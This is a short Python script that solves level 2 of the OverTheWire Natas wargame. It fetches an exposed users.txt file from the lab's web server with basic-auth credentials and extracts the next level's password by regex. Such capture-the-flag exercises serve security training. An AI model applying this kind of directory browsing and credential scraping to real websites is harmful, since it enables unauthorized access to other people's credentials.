import subprocess
import re
import requests
from requests.auth import HTTPBasicAuth

def get_pass():
    #Username and Password for natas website/level
    passw = subprocess.run(['getpass', '2'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas2', passw.strip())
    #Get request to website, creates object that contains a .text property
    #text property holds the html of the webpage
    #There is a "users.txt" under /files/ that contains the natas3 pass
    r = requests.get('http://natas2.natas.labs.overthewire.org/files/users.txt', auth=auth)
    passreg = '[a-zA-Z0-9]{32}'
    print(re.findall(passreg, r.text)[0])

if __name__ == "__main__":
    get_pass()
